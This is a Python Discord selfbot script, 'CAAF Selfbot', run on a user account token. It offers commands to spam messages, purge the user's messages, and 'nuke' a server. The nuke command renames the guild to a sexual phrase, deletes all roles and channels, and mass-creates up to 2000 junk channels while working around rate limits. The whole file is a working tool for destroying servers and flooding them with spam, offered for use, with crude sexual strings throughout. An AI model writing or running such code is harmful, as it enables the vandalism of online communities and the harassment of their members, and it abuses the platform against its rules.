import discord 
import os
import asyncio
import requests
import threading
import random
import httpx
from tasksio import TaskPool
from discord.ext import commands
channel_names = ["dreamybullxxx", "cum"]
token = input(f'token:')
status = input(f'status:')
headers = {'Authorization': f'{token}'}
prefix = "$"
thugz = commands.Bot(command_prefix=prefix, self_bot=True, help_command=None)

@thugz.event
async def on_connect():
  await thugz.change_presence(activity=discord.Activity(type=discord.ActivityType.playing,name=f'{status}'))
async def channelspam(name, session):
    while True:
        s = await session.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers,
                               json={'type': '0', 'name': name})
        if s.status_code == 429:
            json = s.json()
            await asyncio.sleep(json['retry_after'])
        else:
            break

@thugz.command()
async def help(ctx):
  await ctx.message.delete()
  for x in range(1):
    await ctx.send("CAAF Selfbot - Made by ReadKampf & GAF: Help - Shows lists of commands | Purge - Deletes all messages in a guild | Spam - Spams a message and the amount requested | Hi - Posts a funny | Nuke - Nukes the server | https://cdn.discordapp.com/attachments/1015462485488320533/1018225859477385329/higuyz.png")
@thugz.command()
async def purge(ctx):
    await ctx.message.delete()
    amount = 9999
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == thugz.user).map(
            lambda m: m):
        try:
            await message.delete()
        except:
          pass

@thugz.command() 
async def spam(ctx, amount: int, *, msg):
  await ctx.message.delete()
  for _i in range(amount):
   await ctx.send(msg)
  
@thugz.command()
async def hi(ctx):
  await ctx.message.delete()
  for x in range(1):
    await ctx.send("https://cdn.discordapp.com/attachments/1015462485488320533/1017269262118821889/IMG_8041.gif https://cdn.discordapp.com/attachments/1015462485488320533/1017269262542438441/IMG_7807.gif")
@thugz.command()
async def nuke(ctx):
    guild2 = ctx.guild
    await ctx.guild.edit(name="IM CUMMING OH SHIT")
    for role in guild2.roles:
        try:
            await asyncio.gather(*[role.delete() for role in ctx.guild.roles])
        except:
            pass
    for channel in guild2.channels:
            try:
                await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
            except:
                pass
    global guild
    guild = ctx.guild.id
    async with httpx.AsyncClient() as session:
        async with TaskPool(6000) as tasks:
            for _i in range(2000):
                await tasks.put(asyncio.create_task(channelspam(random.choice(channel_names), session)))


thugz.run(token, bot=False)

# Made By 🇷🇺[CAAF]🇷🇺 ReadKampf དΔØŜཌ[ц1]#2933 With Help From gaf#9774
